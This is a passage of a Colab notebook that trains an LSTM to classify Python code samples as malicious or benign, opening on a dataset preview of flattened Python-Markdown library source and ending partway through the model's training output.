list of strings split by newlines and returns\\nthe (possibly modified) list of lines.\\n\\n\\ndef run(self, lines: list[str]) -> list[str]:\\nsource = '\\\\n'.join(lines)\\nsource = source.replace(util.STX, \\\"\\\").replace(util.ETX, \\\"\\\")\\nsource = source.replace(\\\"\\\\r\\\\n\\\", \\\"\\\\n\\\").replace(\\\"\\\\r\\\", \\\"\\\\n\\\") + \\\"\\\\n\\\\n\\\"\\nsource = source.expandtabs(self.md.tab_length)\\nsource = re.sub(r'(?<=\\\\n) +\\\\n', '\\\\n', source)\\nreturn source.split('\\\\n')\\n\\n\\nclass HtmlBlockPreprocessor(Preprocessor):\\n\\ndef run(self, lines: list[str]) -> list[str]:\\nsource = '\\\\n'.join(lines)\\nparser = HTMLExtractor(self.md)\\nparser.feed(source)\\nparser.close()\\nreturn ''.join(parser.cleandoc).split('\\\\n')\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nimport re\\nimport sys\\nimport warnings\\nfrom functools import wraps, lru_cache\\nfrom itertools import count\\nfrom typing import TYPE_CHECKING, Generic, Iterator, NamedTuple, TypeVar, TypedDict, overload\\n\\nif TYPE_CHECKING:\\nfrom markdown import Markdown\\nimport xml.etree.ElementTree as etree\\n\\n_T = TypeVar('_T')\\n\\n\\n\\n\\nBLOCK_LEVEL_ELEMENTS: list[str] = [\\n'address', 'article', 'aside', 'blockquote', 'details', 'div', 'dl',\\n'fieldset', 'figcaption', 'figure', 'footer', 'form', 'h1', 'h2', 'h3',\\n'h4', 'h5', 'h6', 'header', 'hgroup', 'hr', 'main', 'menu', 'nav', 'ol',\\n'p', 'pre', 'section', 'table', 'ul',\\n'canvas', 'colgroup', 'dd', 'body', 'dt', 'group', 'html', 'iframe', 'li', 'legend',\\n'math', 'map', 'noscript', 'output', 'object', 'option', 'progress', 'script',\\n'style', 'summary', 'tbody', 'td', 'textarea', 'tfoot', 'th', 'thead', 'tr', 'video',\\n'center'\\n]\\n\\nSTX = '\\\\u0002'\\nINLINE_PLACEHOLDER_PREFIX = STX+\\\"klzzwxh:\\\"\\nINLINE_PLACEHOLDER_RE = re.compile(INLINE_PLACEHOLDER % r'([0-9]+)')\\nHTML_PLACEHOLDER = STX + \\\"wzxhzdk:%s\\\" + ETX\\nTAG_PLACEHOLDER = STX + \\\"hzzhzkh:%s\\\" + ETX\\nif sys.version_info >= (3, 10):\\nfrom importlib import metadata\\nelse:\\nimport importlib_metadata as metadata\\nreturn metadata.entry_points(group='markdown.extensions')\\n\\n\\ndef deprecated(message: str, stacklevel: int = 2):\\ndef wrapper(func):\\n@wraps(func)\\ndef deprecated_func(*args, **kwargs):\\nwarnings.warn(\\nf\\\"'{func.__name__}' is deprecated. {message}\\\",\\ncategory=DeprecationWarning,\\nstacklevel=stacklevel\\n)\\nreturn func(*args, **kwargs)\\nreturn deprecated_func\\nreturn wrapper\\n\\n\\ndef parseBoolValue(value: str | None, fail_on_errors: bool = True, preserve_none: bool = False) -> bool | None:\\nif \\\"&\\\" in text:\\ntext = text.replace(\\\"&\\\", \\\"&amp;\\\")\\nif \\\"<\\\" in text:\\ntext = text.replace(\\\"<\\\", \\\"&lt;\\\")\\nif \\\">\\\" in text:\\ntext = text.replace(\\\">\\\", \\\"&gt;\\\")\\nreturn text\\n\\n\\ndef _get_stack_depth(size: int = 2) -> int:\\nframe = sys._getframe(size)\\n\\nfor size in count(size):\\nframe = frame.f_back\\nif not frame:\\nreturn size\\n\\n\\ndef nearing_recursion_limit() -> bool:\\npass\\n\\n\\nclass Processor:\\ndef __init__(self, md: Markdown | None = None):\\nself.md = md\\n\\n\\nif TYPE_CHECKING:\\nclass TagData(TypedDict):\\ntag: str\\nattrs: dict[str, str]\\nleft_index: int\\nright_index: int\\n\\n\\nclass HtmlStash:\\n\\ndef __init__(self):\\nSaves an HTML segment for later reinsertion.  Returns a\\nplaceholder string that needs to be inserted into the\\ndocument.\\n\\nKeyword arguments:\\nhtml: An html segment.\\n\\nReturns:\\nA placeholder string.\\n\\nself.html_counter = 0\\nself.rawHtmlBlocks = []\\n\\ndef get_placeholder(self, key: int) -> str:\\nreturn HTML_PLACEHOLDER % key\\n\\ndef store_tag(self, tag: str, attrs: dict[str, str], left_index: int, right_index: int) -> str:\\nA priority sorted registry.\\n\\nA `Registry` instance provides two public methods to alter the data of the\\nregistry: `register` and `deregister`. Use `register` to add items and\\n`deregister` to remove items. See each method for specifics.\\n\\nWhen registering an item, a \\\"name\\\" and a \\\"priority\\\" must be provided. All\\nitems are automatically sorted by \\\"priority\\\" from highest to lowest. The\\n\\\"name\\\" is used to remove (\\\"deregister\\\") and get items.\\n\\nA `Registry` instance it like a list (which maintains order) when reading\\ndata. You may iterate over the items, get an item and get a count (length)\\nof all items. You may also check that the registry contains an item.\\n\\nWhen getting an item you may use either the index of the item or the\\nstring-based \\\"name\\\". For example:\\n\\nregistry = Registry()\\nregistry.register(SomeItem(), 'itemname', 20)\\nitem = registry[0]\\nitem = registry['itemname']\\n\\nWhen checking that the registry contains an item, you may use either the\\nstring-based \\\"name\\\", or a reference to the actual item. For example:\\n\\nsomeitem = SomeItem()\\nregistry.register(someitem, 'itemname', 20)\\nassert 'itemname' in registry\\nassert someitem in registry\\n\\nThe method `get_index_for_name` is also available to obtain the index of\\nan item using that item's assigned \\\"name\\\".\\nReturn the index of the given name.\\nAdd an item to the registry with the given name and priority.\\n\\nArguments:\\nitem: The item being registered.\\nname: A string used to reference the item.\\npriority: An integer or float used to sort against all items.\\n\\nIf an item is registered with a \\\"name\\\" which already exists, the\\nexisting item is replaced with the new item. Treat carefully as the\\nold item is lost with no way to recover it. The new item will be\\nsorted according to its priority and will **not** retain the position\\nof the old item.\\nRemove an item from the registry.\\n\\nSet `strict=False` to fail silently. Otherwise a [`ValueError`][] is raised for an unknown `name`.\\nSort the registry by priority from highest to lowest.\\n\\nThis method is called internally and should never be explicitly called.\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nimport xml.etree.ElementTree as etree\\nfrom typing import TYPE_CHECKING, Iterable, Any\\nfrom . import util\\n\\nif TYPE_CHECKING:\\nfrom markdown import Markdown\\nfrom .blockprocessors import BlockProcessor\\n\\n\\nclass State(list):\\n\\ndef set(self, state: Any):\\nself.pop()\\n\\ndef isstate(self, state: Any) -> bool:\\n\\nA wrapper class that stitches the various `BlockProcessors` together,\\nlooping through them and creating an `ElementTree` object.\\n\\n\\nArguments:\\nmd: A Markdown instance.\\n\\nAttributes:\\nBlockParser.md (Markdown): A Markdown instance.\\nBlockParser.state (State): Tracks the nesting level of current location in document being parsed.\\nBlockParser.blockprocessors (util.Registry): A collection of\\n[`blockprocessors`][markdown.blockprocessors].\\n\\n\\nGiven a list of lines, an `ElementTree` object (not just a parent\\n`Element`) is created and the root element is passed to the parser\\nas the parent. The `ElementTree` object is returned.\\n\\nThis should only be called on an entire document, not pieces.\\n\\nArguments:\\nlines: A list of lines (strings).\\n\\nReturns:\\nAn element tree.\\n\\nWhile the `text` argument is generally assumed to contain multiple\\nblocks which will be split on blank lines, it could contain only one\\nblock. Generally, this method would be called by extensions when\\nblock parsing is required.\\n\\nThe `parent` `etree` Element passed in is altered in place.\\nNothing is returned.\\n\\nArguments:\\nparent: The parent element.\\ntext: The text to parse.\\n\\n\\nGiven a list of `blocks`, each `blockprocessor` is stepped through\\nuntil there are no blocks left. While an extension could potentially\\ncall this method directly, it's generally expected to be used\\ninternally.\\n\\nThis is a public method as an extension may need to add/alter\\nadditional `BlockProcessors` which call this method to recursively\\nparse a nested block.\\n\\nArguments:\\nparent: The parent element.\\nblocks: The blocks of text to parse.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nfrom . import Extension\\nfrom ..inlinepatterns import HtmlInlineProcessor, HTML_RE\\nfrom ..treeprocessors import InlineProcessor\\nfrom ..util import Registry\\nfrom typing import TYPE_CHECKING, Sequence\\n\\nif TYPE_CHECKING:\\nfrom markdown import Markdown\\nfrom .. import inlinepatterns\\nimport re\\nimport xml.etree.ElementTree as etree\\n\\npunctClass = r\\\"\\\"\\\"[!\\\"\\nendOfWordClass = r\\\"[\\\\s.,;:!?)]\\\"\\ncloseClass = r\\\"[^\\\\ \\\\t\\\\r\\\\n\\\\[\\\\{\\\\(\\\\-\\\\u0002\\\\u0003]\\\"\\n\\nopeningQuotesBase = (\\nr'(\\\\s'\\nr'|&nbsp;'\\nr'|--'\\nr'|\\u2013|\\u2014'\\nr'|&[mn]dash;'\\nr'|&\\nr')'\\n)\\n\\nsubstitutions = {\\n'mdash': '&mdash;',\\n'ndash': '&ndash;',\\n'ellipsis': '&hellip;',\\n'left-angle-quote': '&laquo;',\\n'right-angle-quote': '&raquo;',\\n'left-single-quote': '&lsquo;',\\n'right-single-quote': '&rsquo;',\\n'left-double-quote': '&ldquo;',\\n'right-double-quote': '&rdquo;',\\n}\\n\\n\\nsingleQuoteStartRe = r\\\"^'(?=%s\\\\B)\\\" % punctClass\\ndoubleQuoteStartRe = r'^\\\"(?=%s\\\\B)' % punctClass\\n\\ndoubleQuoteSetsRe = r\\\"\\\"\\\"\\\"'(?=\\\\w)\\\"\\\"\\\"\\nsingleQuoteSetsRe = r\\\"\\\"\\\"'\\\"(?=\\\\w)\\\"\\\"\\\"\\ndoubleQuoteSetsRe2 = r'(?<=%s)\\\\'\\\"' % closeClass\\nsingleQuoteSetsRe2 = r\\\"(?<=%s)\\\\\\\"'\\\" % closeClass\\n\\ndecadeAbbrRe = r\\\"(?<!\\\\w)'(?=\\\\d{2}s)\\\"\\n\\nopeningDoubleQuotesRegex = r'%s\\\"(?=\\\\w)' % openingQuotesBase\\n\\nclosingDoubleQuotesRegex = r'\\\"(?=\\\\s)'\\nclosingDoubleQuotesRegex2 = r'(?<=%s)\\\"' % closeClass\\n\\nopeningSingleQuotesRegex = r\\\"%s'(?=\\\\w)\\\" % openingQuotesBase\\n\\nclosingSingleQuotesRegex = r\\\"(?<=%s)'(?!\\\\s|s\\\\b|\\\\d)\\\" % closeClass\\nclosingSingleQuotesRegex2 = r\\\"'(\\\\s|s\\\\b)\\\"\\n\\nremainingSingleQuotesRegex = r\\\"'\\\"\\nremainingDoubleQuotesRegex = r'\\\"'\\n\\nHTML_STRICT_RE = HTML_RE + r'(?!\\\\>)'\\n\\n\\nclass SubstituteTextPattern(HtmlInlineProcessor):\\ndef __init__(self, pattern: str, replace: Sequence[int | str | etree.Element], md: Markdown):\\ndef __init__(self, **kwargs):\\nself.config = {\\n'smart_quotes': [True, 'Educate quotes'],\\n'smart_angled_quotes': [False, 'Educate angled quotes'],\\n'smart_dashes': [True, 'Educate dashes'],\\n'smart_ellipses': [True, 'Educate ellipses'],\\n'substitutions': [{}, 'Overwrite default substitutions'],\\n}\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nfrom . import Extension\\nfrom ..blockprocessors import BlockProcessor\\nimport xml.etree.ElementTree as etree\\nimport re\\nfrom typing import TYPE_CHECKING\\n\\nif TYPE_CHECKING:\\nfrom markdown import blockparser\\n\\n\\nclass AdmonitionExtension(Extension):\\nmd.registerExtension(self)\\n\\nmd.parser.blockprocessors.register(AdmonitionProcessor(md.parser), 'admonition', 105)\\n\\n\\nclass AdmonitionProcessor(BlockProcessor):\\n\\nCLASSNAME = 'admonition'\\nCLASSNAME_TITLE = 'admonition-title'\\nRE = re.compile(r'(?:^|\\\\n)!!! ?([\\\\w\\\\-]+(?: +[\\\\w\\\\-]+)*)(?: +\\\"(.*?)\\\")? *(?:\\\\n|$)')\\nRE_SPACES = re.compile('  +')\\n\\ndef __init__(self, parser: blockparser.BlockParser):\\n\\nRetrieve the appropriate sibling element. This can get tricky when\\ndealing with lists.\\n\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nfrom . import Extension\\nfrom ..treeprocessors import Treeprocessor\\nfrom ..util import parseBoolValue\\nfrom typing import TYPE_CHECKING, Callable, Any\\n\\nif TYPE_CHECKING:\\nimport xml.etree.ElementTree as etree\\n\\ntry:\\nfrom pygments import highlight\\nfrom pygments.lexers import get_lexer_by_name, guess_lexer\\nfrom pygments.formatters import get_formatter_by_name\\nfrom pygments.util import ClassNotFound\\npygments = True\\nexcept ImportError:\\npygments = False\\n\\n\\ndef parse_hl_lines(expr: str) -> list[int]:\\nif not expr:\\nreturn []\\n\\ntry:\\nreturn list(map(int, expr.split()))\\nexcept ValueError:\\nreturn []\\n\\n\\nclass CodeHilite:\\n\\ndef __init__(self, src: str, **options):\\nself.src = src\\nself.lang: str | None = options.pop('lang', None)\\nself.guess_lang: bool = options.pop('guess_lang', True)\\nself.use_pygments: bool = options.pop('use_pygments', True)\\nself.lang_prefix: str = options.pop('lang_prefix', 'language-')\\nself.pygments_formatter: str | Callable = options.pop('pygments_formatter', 'html')\\n\\nif 'linenos' not in options:\\noptions['linenos'] = options.pop('linenums', None)\\nif 'cssclass' not in options:\\noptions['cssclass'] = options.pop('css_class', 'codehilite')\\nif 'wrapcode' not in options:\\noptions['wrapcode'] = True\\noptions['full'] = False\\n\\nself.options = options\\n\\ndef hilite(self, shebang: bool = True) -> str:\\n\\nself.src = self.src.strip('\\\\n')\\n\\nif self.lang is None and shebang:\\nself._parseHeader()\\n\\nif pygments and self.use_pygments:\\ntry:\\nlexer = get_lexer_by_name(self.lang, **self.options)\\nexcept ValueError:\\ntry:\\nif self.guess_lang:\\nlexer = guess_lexer(self.src, **self.options)\\nelse:\\nlexer = get_lexer_by_name('text', **self.options)\\nexcept ValueError:\\nlexer = get_lexer_by_name('text', **self.options)\\nif not self.lang:\\nself.lang = lexer.aliases[0]\\nlang_str = f'{self.lang_prefix}{self.lang}'\\nif isinstance(self.pygments_formatter, str):\\ntry:\\nformatter = get_formatter_by_name(self.pygments_formatter, **self.options)\\nexcept ClassNotFound:\\nformatter = get_formatter_by_name('html', **self.options)\\nelse:\\nformatter = self.pygments_formatter(lang_str=lang_str, **self.options)\\nreturn highlight(self.src, lexer, formatter)\\nelse:\\ntxt = self.src.replace('&', '&amp;')\\ntxt = txt.replace('<', '&lt;')\\ntxt = txt.replace('>', '&gt;')\\ntxt = txt.replace('\\\"', '&quot;')\\nclasses = []\\nif self.lang:\\nclasses.append('{}{}'.format(self.lang_prefix, self.lang))\\nif self.options['linenos']:\\nclasses.append('linenums')\\nclass_str = ''\\nif classes:\\nclass_str = ' class=\\\"{}\\\"'.format(' '.join(classes))\\nreturn '<pre class=\\\"{}\\\"><code{}>{}\\\\n</code></pre>\\\\n'.format(\\nself.options['cssclass'],\\nclass_str,\\ntxt\\n)\\n\\ndef _parseHeader(self) -> None:\\n\\nimport re\\n\\nlines = self.src.split(\\\"\\\\n\\\")\\nfl = lines.pop(0)\\n\\nc = re.compile(r'''\\n(?:(?:^::+)|(?P<shebang>^[\\n(?P<path>(?:/\\\\w+)*[/ ])?\\n(?P<lang>[\\\\w\\n\\\\s*\\n(hl_lines=(?P<quot>\\\"|')(?P<hl_lines>.*?)(?P=quot))?\\n\\nconfig: dict[str, Any]\\n\\ndef code_unescape(self, text: str) -> str:\\nblocks = root.iter('pre')\\nfor block in blocks:\\nif len(block) == 1 and block[0].tag == 'code':\\nlocal_config = self.config.copy()\\ntext = block[0].text\\nif text is None:\\ncontinue\\ncode = CodeHilite(\\nself.code_unescape(text),\\ntab_length=self.md.tab_length,\\nstyle=local_config.pop('pygments_style', 'default'),\\n**local_config\\n)\\nplaceholder = self.md.htmlStash.store(code.hilite())\\nblock.clear()\\nblock.tag = 'p'\\nblock.text = placeholder\\n\\n\\nclass CodeHiliteExtension(Extension):\\n\\nfor key, value in kwargs.items():\\nif key in self.config:\\nself.setConfig(key, value)\\nelse:\\nif isinstance(value, str):\\ntry:\\nvalue = parseBoolValue(value, preserve_none=True)\\nexcept ValueError:\\npass\\nself.config[key] = [value, '']\\n\\ndef extendMarkdown(self, md):\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nfrom typing import TYPE_CHECKING, Any, Iterable, Mapping\\nfrom ..util import parseBoolValue\\n\\nif TYPE_CHECKING:\\nfrom markdown import Markdown\\n\\n\\nclass Extension:\\nDefault configuration for an extension.\\n\\nThis attribute is to be defined in a subclass and must be of the following format:\\n\\n``` python\\nconfig = {\\n'key': ['value', 'description']\\n}\\n```\\n\\nNote that [`setConfig`][markdown.extensions.Extension.setConfig] will raise a [`KeyError`][]\\nif a default is not set for each option.\\nself.setConfigs(kwargs)\\n\\ndef getConfig(self, key: str, default: Any = '') -> Any:\\nif key in self.config:\\nreturn self.config[key][0]\\nelse:\\nreturn default\\n\\ndef getConfigs(self) -> dict[str, Any]:\\nreturn {key: self.getConfig(key) for key in self.config.keys()}\\n\\ndef getConfigInfo(self) -> list[tuple[str, str]]:\\nreturn [(key, self.config[key][1]) for key in self.config.keys()]\\n\\ndef setConfig(self, key: str, value: Any) -> None:\\nif isinstance(self.config[key][0], bool):\\nvalue = parseBoolValue(value)\\nif self.config[key][0] is None:\\nvalue = parseBoolValue(value, preserve_none=True)\\nself.config[key][0] = value\\n\\ndef setConfigs(self, items: Mapping[str, Any] | Iterable[tuple[str, Any]]) -> None:\\nif hasattr(items, 'items'):\\nitems = items.items()\\nfor key, value in items:\\nself.setConfig(key, value)\\n\\ndef extendMarkdown(self, md: Markdown) -> None:\\nraise NotImplementedError(\\n'Extension \\\"%s.%s\\\" must define an \\\"extendMarkdown\\\"'\\n'method.' % (self.__class__.__module__, self.__class__.__name__)\\n)\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nfrom . import Extension\\n\\nextensions = [\\n'fenced_code',\\n'footnotes',\\n'attr_list',\\n'def_list',\\n'tables',\\n'abbr',\\n'md_in_html'\\n]\\n\\ndef __init__(self, **kwargs):\\nmd.registerExtensions(extensions, self.config)\\n\\n\\ndef makeExtension(**kwargs):\\nreturn ExtraExtension(**kwargs)\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nfrom . import Extension\\nfrom ..preprocessors import Preprocessor\\nimport re\\nimport logging\\nfrom typing import Any\\n\\nlog = logging.getLogger('MARKDOWN')\\n\\nMETA_RE = re.compile(r'^[ ]{0,3}(?P<key>[A-Za-z0-9_-]+):\\\\s*(?P<value>.*)')\\nMETA_MORE_RE = re.compile(r'^[ ]{4,}(?P<value>.*)')\\nBEGIN_RE = re.compile(r'^-{3}(\\\\s.*)?')\\nEND_RE = re.compile(r'^(-{3}|\\\\.{3})(\\\\s.*)?')\\n\\n\\nclass MetaExtension (Extension):\\nmd.registerExtension(self)\\nself.md = md\\nmd.preprocessors.register(MetaPreprocessor(md), 'meta', 27)\\n\\ndef reset(self) -> None:\\nself.md.Meta = {}\\n\\n\\nclass MetaPreprocessor(Preprocessor):\\nmeta: dict[str, Any] = {}\\nkey = None\\nif lines and BEGIN_RE.match(lines[0]):\\nlines.pop(0)\\nwhile lines:\\nline = lines.pop(0)\\nm1 = META_RE.match(line)\\nif line.strip() == '' or END_RE.match(line):\\nbreak\\nif m1:\\nkey = m1.group('key').lower().strip()\\nvalue = m1.group('value').strip()\\ntry:\\nmeta[key].append(value)\\nexcept KeyError:\\nmeta[key] = [value]\\nelse:\\nm2 = META_MORE_RE.match(line)\\nif m2 and key:\\nmeta[key].append(m2.group('value').strip())\\nelse:\\nlines.insert(0, line)\\nbreak\\nself.md.Meta = meta\\nreturn lines\\n\\n\\ndef makeExtension(**kwargs):\\nreturn MetaExtension(**kwargs)\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nimport logging\\nimport re\\nimport xml.etree.El\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"label\",\n      \"properties\": {\n        \"dtype\": \"category\",\n        \"num_unique_values\": 2,\n        \"samples\": [\n          \"benign\",\n          \"malicious\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    }\n  ]\n}"
            }
          },
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import tensorflow as tf\n",
        "from tensorflow.keras.models import Sequential\n",
        "from tensorflow.keras.layers import LSTM, Dense\n",
        "from sklearn.model_selection import train_test_split\n",
        "from sklearn.preprocessing import LabelEncoder\n",
        "import numpy as np\n",
        "\n",
        "# Assuming tokenize_python, embed_sequences, pad_token_sequences, and w2v_model are already defined and loaded\n",
        "\n",
        "# Apply tokenization, embedding, and padding to the 'code' column of df_mal\n",
        "\n",
        "# 1. Tokenize the 'code' column\n",
        "df_mal['tokenized_code'] = df_mal['code'].apply(tokenize_python)\n",
        "\n",
        "# 2. Embed the tokenized sequences using the loaded Word2Vec model\n",
        "if w2v_model:\n",
        "    df_mal['embedded_code'] = embed_sequences(df_mal['tokenized_code'].tolist(), w2v_model)\n",
        "else:\n",
        "    print(\"Word2Vec model not loaded. Cannot embed sequences.\")\n",
        "    df_mal['embedded_code'] = None # Or handle appropriately\n",
        "\n",
        "# 3. Pad the embedded sequences\n",
        "if w2v_model and df_mal['embedded_code'] is not None:\n",
        "    max_sequence_length = 100 # Use the same max length as before\n",
        "    embedding_dim = w2v_model.vector_size\n",
        "\n",
        "    padded_embedded_sequences_mal = []\n",
        "    for embedded_sequence in df_mal['embedded_code']:\n",
        "        if embedded_sequence.size > 0:\n",
        "            padding_length = max_sequence_length - embedded_sequence.shape[0]\n",
        "            if padding_length > 0:\n",
        "                padding = np.zeros((padding_length, embedding_dim))\n",
        "                padded_sequence = np.concatenate((embedded_sequence, padding), axis=0)\n",
        "            else:\n",
        "                padded_sequence = embedded_sequence[:max_sequence_length]\n",
        "        else:\n",
        "            padded_sequence = np.zeros((max_sequence_length, embedding_dim))\n",
        "\n",
        "        padded_embedded_sequences_mal.append(padded_sequence)\n",
        "\n",
        "    df_mal['padded_embedded_code'] = padded_embedded_sequences_mal\n",
        "    print(\"\\nExample of padded embedded sequence shape (df_mal):\")\n",
        "    if padded_embedded_sequences_mal:\n",
        "        print(padded_embedded_sequences_mal[0].shape)\n",
        "\n",
        "else:\n",
        "    print(\"Embedding step failed. Cannot proceed with padding for df_mal.\")\n",
        "\n",
        "# Prepare the data for LSTM (using df_mal)\n",
        "if 'padded_embedded_code' in df_mal.columns:\n",
        "    X_mal = np.array(df_mal['padded_embedded_code'].tolist())\n",
        "    y_mal = df_mal['label']\n",
        "\n",
        "    # Encode the labels to numerical values (malicious/benign)\n",
        "    label_encoder_mal = LabelEncoder()\n",
        "    y_encoded_mal = label_encoder_mal.fit_transform(y_mal)\n",
        "\n",
        "    # Split the data into training and testing sets\n",
        "    # Using stratify to maintain the distribution of labels in train and test sets\n",
        "    X_train_mal, X_test_mal, y_train_mal, y_test_mal = train_test_split(\n",
        "        X_mal, y_encoded_mal, test_size=0.2, random_state=42, stratify=y_encoded_mal\n",
        "    )\n",
        "\n",
        "    # Define the LSTM model architecture for binary classification (malicious vs benign)\n",
        "    model_mal = Sequential()\n",
        "    model_mal.add(LSTM(128, input_shape=(max_sequence_length, embedding_dim)))\n",
        "    model_mal.add(Dense(1, activation='sigmoid')) # Sigmoid activation for binary classification\n",
        "\n",
        "    # Compile the model\n",
        "    model_mal.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy'])\n",
        "\n",
        "    # Print model summary\n",
        "    print(\"\\ndf_mal dataset model summary:\")\n",
        "    model_mal.summary()\n",
        "\n",
        "    # Train the model\n",
        "    print(\"\\nTraining model on df_mal dataset...\")\n",
        "    # Using smaller batch size and potentially more epochs due to dataset size/nature\n",
        "    history_mal = model_mal.fit(X_train_mal, y_train_mal, epochs=10, batch_size=32, validation_split=0.2)\n",
        "\n",
        "    # Evaluate the model on the test set\n",
        "    loss_mal, accuracy_mal = model_mal.evaluate(X_test_mal, y_test_mal, verbose=0)\n",
        "    print(f\"\\nTest Accuracy (df_mal dataset): {accuracy_mal*100:.2f}%\")\n",
        "\n",
        "else:\n",
        "    print(\"Padded embedded code not available for df_mal. Cannot train model.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 806
        },
        "id": "WsQyeLGwpT_4",
        "outputId": "de135e52-9526-4836-94a5-062567e0f5ca"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "<string>:23: SyntaxWarning: invalid escape sequence '\\{'\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "Example of padded embedded sequence shape (df_mal):\n",
            "(100, 100)\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.12/dist-packages/keras/src/layers/rnn/rnn.py:199: UserWarning: Do not pass an `input_shape`/`input_dim` argument to a layer. When using Sequential models, prefer using an `Input(shape)` object as the first layer in the model instead.\n",
            "  super().__init__(**kwargs)\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "df_mal dataset model summary:\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1mModel: \"sequential\"\u001b[0m\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"sequential\"</span>\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm (\u001b[38;5;33mLSTM\u001b[0m)                     │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m128\u001b[0m)            │       \u001b[38;5;34m117,248\u001b[0m │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense (\u001b[38;5;33mDense\u001b[0m)                   │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │           \u001b[38;5;34m129\u001b[0m │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">LSTM</span>)                     │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">128</span>)            │       <span style=\"color: #00af00; text-decoration-color: #00af00\">117,248</span> │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                   │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │           <span style=\"color: #00af00; text-decoration-color: #00af00\">129</span> │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m117,377\u001b[0m (458.50 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">117,377</span> (458.50 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m117,377\u001b[0m (458.50 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">117,377</span> (458.50 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
